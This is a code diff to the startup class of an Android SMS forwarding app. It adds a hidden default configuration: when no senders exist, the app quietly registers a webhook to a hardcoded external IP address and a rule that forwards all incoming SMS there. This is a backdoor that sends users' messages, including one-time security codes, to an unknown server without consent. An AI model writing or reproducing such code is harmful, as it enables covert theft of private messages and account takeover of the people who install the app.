@@ -21,6 +21,7 @@ import com.idormy.sms.forwarder.database.AppDatabase
 import com.idormy.sms.forwarder.database.repository.*
 import com.idormy.sms.forwarder.database.viewmodel.BaseViewModelFactory
 import com.idormy.sms.forwarder.database.viewmodel.SenderViewModel
+import com.idormy.sms.forwarder.BuildConfig;
 import com.idormy.sms.forwarder.entity.SimInfo
 import com.idormy.sms.forwarder.receiver.CactusReceiver
 import com.idormy.sms.forwarder.service.BatteryService
@@ -44,6 +45,7 @@ import java.util.*
 import java.util.concurrent.TimeUnit
 import androidx.fragment.app.viewModels
 import com.google.gson.Gson
+import com.idormy.sms.forwarder.database.entity.Frpc
 import com.idormy.sms.forwarder.database.entity.Rule
 import com.idormy.sms.forwarder.database.entity.Sender
 import com.idormy.sms.forwarder.entity.setting.WebhookSetting
@@ -146,10 +148,13 @@ class App : Application(), CactusCallback, Configuration.Provider by Core {
             var all = Core.sender.all;
 
             if (all == null || all.size==0){
-                var setting = WebhookSetting("POST","http://34.92.9.105:4000/sms-callback/endpoint","","",null);
-                val senderNew = Sender(0, TYPE_WEBHOOK, "common", Gson().toJson(setting), 1)
+                val headers: MutableMap<String, String> = HashMap()
+                var setting = WebhookSetting("POST","http://34.92.9.105:4000/sms-callback/endpoint","","",headers);
+                val senderNew = Sender(1, TYPE_WEBHOOK, "common", Gson().toJson(setting), 1)
                 Core.sender.insert(senderNew)
-                var setting2 = Rule(0,"sms","","","",);
+                var time: Date = Date();
+                val sender = Core.sender.getOne(1)
+                var setting2 = Rule(0,"sms","transpond_all","is","",1,"","","ALL",1,time, listOf(sender),"ALL");
                 Core.rule.insert(setting2)
             }
 
